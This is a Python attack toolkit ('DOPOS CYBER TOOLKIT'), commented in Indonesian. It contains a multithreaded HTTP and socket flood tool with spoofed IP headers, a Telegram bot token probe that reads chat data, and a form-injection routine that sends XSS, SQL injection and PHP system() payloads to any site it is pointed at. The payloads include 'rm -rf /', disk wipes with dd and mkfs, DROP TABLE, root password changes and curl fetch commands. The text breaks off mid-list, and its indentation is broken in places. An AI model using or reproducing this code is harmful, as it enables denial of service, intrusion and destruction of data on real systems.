import os
import sys
import time
import random
import requests
import threading
from urllib.parse import urlparse, urljoin
import socket
import ssl
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
except ImportError:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings
import urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Daftar user agents global
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
   
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/121.0.6164.98 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    
    # Bing Bots (2)
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/121.0.6164.98 Safari/537.36",
    
    # Facebook Bots (2)
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (compatible; FacebookBot/3.1; +http://www.facebook.com)",
    
    # Twitter Bots (2)
    "Twitterbot/1.0",
    "Mozilla/5.0 (compatible; Twitterbot/1.0; +https://twitter.com)",
    
    # LinkedIn Bots (1)
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
    
    # Baidu Bots (1)
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    
    # Yandex Bots (1)
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    
    # DuckDuckGo Bots (1)
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    
    # SEO Bots (2)
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    
    # Monitoring Bots (1)
    "UptimeRobot/2.0",
    
    # Scraping Bots (1)
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
    
    # AI Bots (1)
    "ChatGPT-User",
    
    # Aggressive Crawlers (1)
    "Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)"
]

random_paths = [
    '/', '/index.html', '/index.php', '/home', '/main', '/default', '/web', '/site',
    
    # ADMIN & SECURITY
    '/admin', '/administrator', '/wp-admin', '/wp-login.php', '/login', '/logout', '/signin', '/signup',
    '/register', '/auth', '/authentication', '/secure', '/security', '/protected',
    
    # USER MANAGEMENT
    '/user', '/users', '/profile', '/account', '/myaccount', '/dashboard', '/panel', '/control',
    '/settings', '/config', '/configuration', '/preferences', '/options',
    
    # CONTENT PAGES
    '/about', '/about-us', '/contact', '/contact-us', '/products', '/services', '/news', '/blog',
    '/articles', '/posts', '/forum', '/forums', '/discussion', '/shop', '/store', '/market',
    '/gallery', '/portfolio', '/media', '/images', '/photos', '/videos', '/downloads',
    
    # API & DATA
    '/api', '/api/v1', '/api/v2', '/api/v3', '/json', '/xml', '/rss', '/feed', '/atom',
    '/graphql', '/rest', '/soap', '/data', '/export', '/import',
    
    # SYSTEM FILES
    '/sitemap.xml', '/sitemap.txt', '/sitemap.html', '/robots.txt', '/humans.txt',
    '/security.txt', '/.well-known/security.txt', '/crossdomain.xml', '/clientaccesspolicy.xml',
    
    # CONFIGURATION FILES
    '/config.php', '/configuration.php', '/settings.php', '/config.json', '/config.xml',
    '/.env', '/.env.local', '/.env.production', '/.env.development',
    '/wp-config.php', '/config.py', '/config.yml', '/config.yaml',
    
    # BACKUP & DATABASE
    '/backup', '/backups', '/database', '/db', '/sql', '/mysql', '/phpmyadmin', '/adminer.php',
    '/backup.zip', '/backup.sql', '/backup.tar', '/backup.tar.gz', '/dump.sql', '/export.sql',
    
    # UPLOAD & FILES
    '/upload', '/uploads', '/files', '/documents', '/assets', '/static', '/public',
    '/images/uploads', '/files/upload', '/assets/uploads',
    
    # SEARCH & NAVIGATION
    '/search', '/find', '/query', '/results', '/browse', '/explore', '/discover',
    '/category', '/categories', '/tag', '/tags', '/archive', '/archives',
    
    # E-COMMERCE
    '/cart', '/shopping-cart', '/checkout', '/order', '/orders', '/payment', '/pay',
    '/billing', '/invoice', '/invoices', '/receipt', '/purchase', '/buy',
    
    # SUPPORT & LEGAL
    '/help', '/support', '/faq', '/faqs', '/documentation', '/docs', '/guide',
    '/terms', '/terms-of-service', '/privacy', '/privacy-policy', '/policy',
    '/legal', '/disclaimer', '/cookie-policy', '/cookies',
    
    # SYSTEM STATUS
    '/status', '/health', '/healthcheck', '/ping', '/ready', '/live', '/alive',
    '/monitor', '/monitoring', '/metrics', '/stats', '/statistics', '/analytics',
    
    # DEVELOPMENT
    '/dev', '/development', '/test', '/testing', '/debug', '/console', '/shell',
    '/phpinfo', '/info.php', '/test.php', '/debug.php',
    
    # CACHE & TEMP
    '/cache', '/caches', '/temp', '/tmp', '/temporary', '/session', '/sessions',
    
    # LOG FILES
    '/logs', '/log', '/error.log', '/access.log', '/debug.log', '/system.log',
    
    # SECURITY SCAN
    '/.git', '/.git/config', '/.svn', '/.hg', '/.DS_Store', '/thumbs.db',
    '/backup.zip', '/backup.rar', '/backup.7z', '/backup.bak',
    
    # WEB SERVICES
    '/wsdl', '/webdav', '/ftp', '/ssh', '/telnet', '/smtp',
    
    # MOBILE & APPS
    '/mobile', '/m', '/app', '/application', '/android', '/ios', '/api/mobile',
    
    # REDIRECTS
    '/redirect', '/go', '/url', '/link', '/out', '/external',
    
    # MISC
    '/404', '/500', '/error', '/success', '/warning', '/info',
    '/version', '/changelog', '/license', '/credits', '/thanks'
]

# Fungsi membersihkan layar
def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        print("\n" * 50)

# Fungsi untuk membuat progress bar
def progress_bar(progress, total, width=50):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '-' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

# Animasi loading brutal dengan progress
def brutal_loading(text, duration=2):
    print(f"{CYAN}[+] {text}", end="")
    for i in range(int(duration * 10)):
        symbols = ["\\", "|", "/", "-", "#", "@", "!", "*"]
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)} {progress_bar(i + 1, duration * 10)}", end="")
        time.sleep(0.1)
    print(f"\r{GREEN}[+] {text} SUKSES!{CYAN}")

# Header brutal
def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {RED}           ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{RED}           ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{RED}           ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{RED}           ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{RED}           ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RED}           ║
╚═════════════════════════════════════════════════════════════════
{LIGHT_BLUE}                    DOPOS CYBER TOOLKIT v3.0
{RED}═════════════════════════════════════════════════════════════════
{CYAN}[+] Status: {GREEN}READY FOR DESTRUCTION{CYAN}     [+] Mode: {RED}ULTRA BRUTAL{CYAN}
{RED}═════════════════════════════════════════════════════════════════
""")


def log_to_file(message):
    try:
        with open('dopos_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass
   # Fungsi parse target
def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port


# 1. Dodos Serang (Advanced HTTP Flood)
def dodos_serang():
    show_header()
    print(f"{RED}[1] DODOS SERANG - ULTRA BRUTAL MODE")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 1-300): {WHITE}"))
        threads = int(input(f"{CYAN}[?] Jumlah thread (1-7000): {WHITE}"))
        if threads <= 0 or threads > 7000:
            raise ValueError("Jumlah thread harus antara 1 dan 7000")
        if duration <= 0 or duration > 60:
            raise ValueError("Durasi harus antara 1 dan 60 detik")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    domain, path, port = parse_target(target)
    
    print(f"\n{RED}[!] MEMULAI SERANGAN ULTRA BRUTAL...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    log_to_file(f"Starting DDoS attack on {target} (Domain: {domain}, Port: {port}, Duration: {duration}s, Threads: {threads})")
    
    request_count = {'success': 0, 'failed': 0}
    lock = threading.Lock()
    
    def http_attack():
        timeout = time.time() + duration
        session = requests.Session()
        
        while time.time() < timeout:
            try:
          headers = {
         'User-Agent': random.choice(user_agents),
              (user_agents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,zh;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Referer': target,
    'DNT': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-CH-UA': '"Chromium";v="122", "Not(A:Brand";v="24"',
    'Sec-CH-UA-Mobile': '?1',
    'Sec-CH-UA-Platform': '"Windows"',
    'Viewport-Width': '1440',
    'Width': '1440',
    'X-Requested-With': 'XMLHttpRequest',
    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'X-Forwarded-Host': target,
    'X-Forwarded-Proto': 'https',
    'X-Original-URL': '/admin',
    'X-Rewrite-URL': '/',
    'X-CSRF-Token': ''.join(random.choices('abcdef0123456789', k=32)),
    'X-Request-ID': ''.join(random.choices('abcdef0123456789', k=16)),
    'X-Device-ID': ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=24)),
    'X-Api-Key': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=40)),
    'X-Auth-Token': ''.join(random.choices('abcdef0123456789', k=64)),
    'Authorization': 'Bearer ' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_', k=120)),
    'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'Forwarded': f'for={random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)};proto=https;host={target}',
    'Via': '1.1 google',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Origin': target,
    'Purpose': 'prefetch',
    'Save-Data': 'on',
    'Device-Memory': '8',
    'Downlink': '10',
    'ECT': '4g',
    'RTT': '50',
    'Priority': 'u=1, i'
}
                random_path = random.choice(random_paths)
                attack_url = target + random_path
                
                params = {
                    'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)),
                    'id': random.randint(1000000000000000000000000, 9999999999999999999999999999999),
                    'page': random.randint(1, 1000000000000000000000000),
                }
                
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if method == 'POST':
                    data = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=1000))}
                    response = session.post(attack_url, headers=headers, data=data, timeout=5, verify=False, allow_redirects=True)
                else:
                    response = session.request(method, attack_url, headers=headers, params=params, timeout=5, verify=False, allow_redirects=True)
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                    log_to_file(f"HTTP {method} request to {attack_url} succeeded (Status: {response.status_code})")
                
            except:
                with lock:
                    request_count['failed'] += 1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                continue
    
    def socket_attack():
        timeout = time.time() + duration
        
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                
                request = f"GET {path}?{random.randint(1000000000000000,999999999999999999999)} HTTP/1.1\r\n"
                request += f"Host: {domain}\r\n"
                request += f"User-Agent: {random.choice(user_agents)}\r\n"
                request += f"Accept: */*\r\n"
                request += f"Connection: keep-alive\r\n\r\n"
                
                s.send(request.encode())
                s.send(random.randbytes(500))
                time.sleep(0.01)
                s.close()
                
                with lock:
                    request_count['success'] += 1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                    log_to_file(f"Socket request to {domain}:{port} succeeded")
                
            except:
                with lock:
                    request_count['failed'] += 1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}", end="")
                continue
    
    brutal_loading("Inisialisasi serangan", 1)
    start_time = time.time()
    
    for _ in range(threads // 1):
        thread = threading.Thread(target=http_attack)
        thread.daemon = True
        thread.start()
    
    for _ in range(threads // 1):
        thread = threading.Thread(target=socket_attack)
        thread.daemon = True
        thread.start()
    
    while time.time() < start_time + duration:
        elapsed = time.time() - start_time
        print(f"\r{CYAN}[+] Progress: {progress_bar(elapsed, duration)} | Requests: {request_count['success']} | Failed: {request_count['failed']}", end="")
        time.sleep(0.5)
    
    print(f"\n{GREEN}[+] SERANGAN SELESAI!")
    print(f"{RED}[!] Target telah dihancurkan!")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']} successful, {YELLOW}{request_count['failed']} failed")
    log_to_file(f"Attack finished. Total: {request_count['success']} successful, {request_count['failed']} failed")
    
    try:
        brutal_loading("Memeriksa status target", 2)
        response = requests.get(target, timeout=10, verify=False)
        if response.status_code == 200:
            print(f"{YELLOW}[!] Target masih aktif, tapi mungkin lambat")
            print(f"{CYAN}[+] Response time: {WHITE}{response.elapsed.total_seconds()} detik")
            log_to_file(f"Target check: Still active, response time {response.elapsed.total_seconds()}s")
        else:
            print(f"{GREEN}[+] Target down! Status code: {response.status_code}")
            log_to_file(f"Target check: Down, status code {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"{GREEN}[+] Target timeout! Serangan berhasil!")
        log_to_file("Target check: Timeout")
    except requests.exceptions.ConnectionError:
        print(f"{GREEN}[+] Target tidak bisa diakses! Serangan berhasil!")
        log_to_file("Target check: Connection error")
    except Exception as e:
        print(f"{GREEN}[+] Target error: {str(e)}")
        log_to_file(f"Target check: Error {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 2. Melacak Token BOT
def lacak_token_bot():
    show_header()
    print(f"{CYAN}[2] LACAK TOKEN BOT - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    token = input(f"{CYAN}[?] Masukkan token BOT: {WHITE}")
    if not token:
        print(f"{RED}[!] Token tidak boleh kosong!")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    brutal_loading("Memverifikasi token", 2)
    log_to_file(f"Checking Telegram bot token: {token[:10]}...")
    
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                bot_info = data['result']
                
                print(f"\n{GREEN}[+] TOKEN VALID!")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{CYAN}║ {'Nama BOT'.ljust(20)} : {WHITE}{bot_info['first_name'].ljust(37)} ║")
                print(f"{CYAN}║ {'Username'.ljust(20)} : {WHITE}@{bot_info['username'].ljust(36)} ║")
                print(f"{CYAN}║ {'ID'.ljust(20)} : {WHITE}{str(bot_info['id']).ljust(37)} ║")
                print(f"{CYAN}║ {'Bisa bergabung'.ljust(20)} : {WHITE}{'Ya'.ljust(37) if bot_info['can_join_groups'] else 'Tidak'.ljust(37)} ║")
                print(f"{CYAN}║ {'Bisa baca pesan'.ljust(20)} : {WHITE}{'Ya'.ljust(37) if bot_info.get('can_read_all_group_messages', False) else 'Tidak'.ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Bot token valid: @{bot_info['username']} (ID: {bot_info['id']})")
                
                brutal_loading("Mengambil data chat", 2)
                updates_url = f"https://api.telegram.org/bot{token}/getUpdates"
                updates = requests.get(updates_url, timeout=5, verify=False).json()
                
                if updates['result']:
                    print(f"\n{RED}[!] CHAT TERAKHIR TERDETEKSI:")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                    for update in updates['result'][:3]:
                        if 'message' in update:
                            chat = update['message']['chat']
                            print(f"{YELLOW}║ {'ID'.ljust(10)} : {WHITE}{str(chat['id']).ljust(20)} | {'Nama'.ljust(10)} : {WHITE}{chat.get('first_name', 'Unknown').ljust(20)} ║")
                            log_to_file(f"Chat detected: ID {chat['id']}, Name {chat.get('first_name', 'Unknown')}")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                else:
                    print(f"\n{YELLOW}[!] Tidak ada chat aktif")
                    log_to_file("No active chats found")
                
                print(f"\n{RED}[!] PERINGATAN: TOKEN TELAH TERLACAK!")
            else:
                print(f"\n{RED}[!] TOKEN INVALID!")
                log_to_file("Token invalid")
        else:
            print(f"\n{RED}[!] GAGAL TERHUBUNG KE API!")
            log_to_file("Failed to connect to Telegram API")
            
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error checking token: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 3. Mengambil Data HTML Paksa
def ambil_html_paksa():
    show_header()
    print(f"{CYAN}[3] AMBIL DATA HTML PAKSA - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    brutal_loading("Membypass proteksi", 2)
    brutal_loading("Mengambil data paksa", 3)
    log_to_file(f"Scraping HTML from {url}")
    
    try:
        from bs4 import BeautifulSoup
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }
        
        session = requests.Session()
        response = session.get(url, headers=headers, timeout=15, verify=False)
        
        if response.status_code == 200:
            brutal_loading("Menganalisis struktur", 2)
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            print(f"\n{GREEN}[+] BERHASIL MENGAMBIL DATA HTML!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            print(f"{CYAN}║ {'Status Code'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
            print(f"{CYAN}║ {'Ukuran Data'.ljust(20)} : {WHITE}{str(len(response.text)).ljust(37)} bytes ║")
            print(f"{CYAN}║ {'Server'.ljust(20)} : {WHITE}{response.headers.get('Server', 'Unknown').ljust(37)} ║")
            print(f"{CYAN}║ {'Content-Type'.ljust(20)} : {WHITE}{response.headers.get('Content-Type', 'Unknown').ljust(37)} ║")
            
            title = soup.find('title').text if soup.find('title') else 'No Title'
            print(f"{CYAN}║ {'Judul Halaman'.ljust(20)} : {WHITE}{title[:37].ljust(37)} ║")
            
            forms = soup.find_all('form')
            print(f"{CYAN}║ {'Jumlah Form'.ljust(20)} : {WHITE}{str(len(forms)).ljust(37)} ║")
            
            inputs = soup.find_all('input')
            print(f"{CYAN}║ {'Jumlah Input'.ljust(20)} : {WHITE}{str(len(inputs)).ljust(37)} ║")
            
            links = soup.find_all('a')
            print(f"{CYAN}║ {'Jumlah Link'.ljust(20)} : {WHITE}{str(len(links)).ljust(37)} ║")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            log_to_file(f"HTML scraped: Status {response.status_code}, Forms {len(forms)}, Inputs {len(inputs)}, Links {len(links)}")
            
            if forms:
                print(f"\n{RED}[!] FORM TERDETEKSI (POTENSI KERENTANAN):")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                for i, form in enumerate(forms[:3]):
                    action = form.get('action', '')
                    method = form.get('method', 'get')
                    print(f"{YELLOW}║ Form {i+1}: {WHITE}Action={action[:30].ljust(30)} | Method={method.ljust(10)} ║")
                    log_to_file(f"Form {i+1}: Action={action}, Method={method}")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            try:
                with open('target_dump.html', 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"\n{GREEN}[+] Data telah disimpan ke: target_dump.html")
                log_to_file("HTML saved to target_dump.html")
            except Exception as e:
                print(f"{YELLOW}[!] Gagal menyimpan file: {str(e)}")
                log_to_file(f"Failed to save HTML: {str(e)}")
            
            print(f"{RED}[!] SIAP UNTUK DIMANIPULASI!")
        else:
            print(f"\n{RED}[!] GAGAL: Status Code {response.status_code}")
            log_to_file(f"Failed to scrape HTML: Status {response.status_code}")
            
    except ImportError:
        print(f"\n{RED}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.")
        log_to_file("BeautifulSoup module not found")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error scraping HTML: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 4. Merusak Data Script Online
def merusak_data_online():
    show_header()
    print(f"{RED}[4] MERUSAK DATA SCRIPT ONLINE - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    brutal_loading("Menganalisis target", 2)
    brutal_loading("Mempersiapkan payload", 3)
    log_to_file(f"Starting vulnerability test on {url}")
    
    try:
        from bs4 import BeautifulSoup
        session = requests.Session()
        response = session.get(url, timeout=15, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if forms:
            print(f"\n{GREEN}[+] FORM TERDETEKSI - SIAP DIMANIPULASI!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            for i, form in enumerate(forms):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action)
                
                print(f"\n{CYAN}FORM {i+1}:")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{YELLOW}║ {'Action'.ljust(20)} : {WHITE}{form_url[:37].ljust(37)} ║")
                print(f"{YELLOW}║ {'Method'.ljust(20)} : {WHITE}{method.ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Form {i+1}: Action={form_url}, Method={method}")
                
                inputs = form.find_all('input')
                textareas = form.find_all('textarea')
                form_data = {}
                
                for inp in inputs:
                    name = inp.get('name')
                    if not name:
                        continue
                    inp_type = inp.get('type', 'text')
                    value = inp.get('value', '')
                    
                    if inp_type == 'text':
                        form_data[name] = "<script>alert('DOPOS HACKED!');</script>"
                    elif inp_type == 'hidden':
                        form_data[name] = value
                    elif inp_type == 'password':
                        form_data[name] = "' OR '1'='1"
                    else:
                        form_data[name] = "DOPOS_BRUTAL"
                
                for textarea in textareas:
                    name = textarea.get('name')
                    if name:
                        form_data[name] = "<script>alert('XSS!');</script>"
                
                brutal_loading("Mengirim payload berbahaya", 2)
                if method == 'post':
                    response = session.post(form_url, data=form_data, timeout=15, verify=False)
                else:
                    response = session.get(form_url, params=form_data, timeout=15, verify=False)
                
                print(f"{GREEN}[+] Payload terkirim!")
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Payload sent to {form_url}, Status: {response.status_code}")
                
                  if any(payload in response.text for payload in [
    "<script>alert('DOPOS HACKED!');</script>",
    "DOPOS HACKED!",
    "onerror=\"alert('DOPOS')\"",
    "<?php system('rm -rf /'); ?>",
    "'; DROP TABLE",
    "../../../etc/passwd",
    "${jndi:ldap://",
    "javascript:eval(",
    "<iframe src=\"javascript:",
    "<?php @ini_set(",
    "'; EXEC xp_cmdshell",
    "|| curl http://",
    "`wget http://",
    "<?php file_put_contents('/tmp/",
    "'; UPDATE users SET",
    "<?php while(1){",
    "<?php system('shutdown",
    "<?php system('dd if=/dev/zero",
    "<?php system('pkill -9",
    "<?php system('iptables -F",
    "<?php system('echo c > /proc/sysrq-trigger",
    "<?php system('useradd -o -u 0",
    "<?php system('echo \"* * * * * curl",
    "<?php system('chmod 000 /bin",
    "<?php system('find / -name",
    "<?php system('mysql -e \"DROP",
    "<?php system('service apache2 stop",
    "<?php system('swapoff -a",
    "<?php system('mkfs.ext4",
    "<?php system('history -c",
    "<?php system('passwd -l root"
]):
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERKONFIRMASI!")
                    log_to_file("XSS vulnerability confirmed")
                elif "error" in response.text.lower() or "mysql" in response.text.lower():
                    print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                    log_to_file("SQLi vulnerability confirmed")
                else:
                    print(f"{YELLOW}[!] Gagal, mencoba payload lain...")
                    log_to_file("Initial payload failed, trying SQLi payload")
                    
                    for name in form_data:
                        form_data[name] = ["'; DROP TABLE users; --"
                                              "'; DROP TABLE mysql.user, mysql.db, mysql.tables_priv; --"
                                                  "'; TRUNCATE TABLE wp_users; DELETE FROM wp_posts; --",
                                                      "'; UPDATE mysql.user SET Password=PASSWORD('hacked') WHERE User='root'; FLUSH PRIVILEGES; --",
                                  "<?php system('rm -rf / --no-preserve-root 2>/dev/null & disown'); ?>",
                                               
                "<?php system('dd if=/dev/random of=/dev/sda bs=1M &'); ?>",

               "<?php system('mkfs.ext4 /dev/sda -F && mkfs.ext4 /dev/sdb -F'); ?>",
                                                                      "<?php ini_set('memory_limit','-1'); while(1){$x[]=str_repeat(chr(rand()),10000000);} ?>",
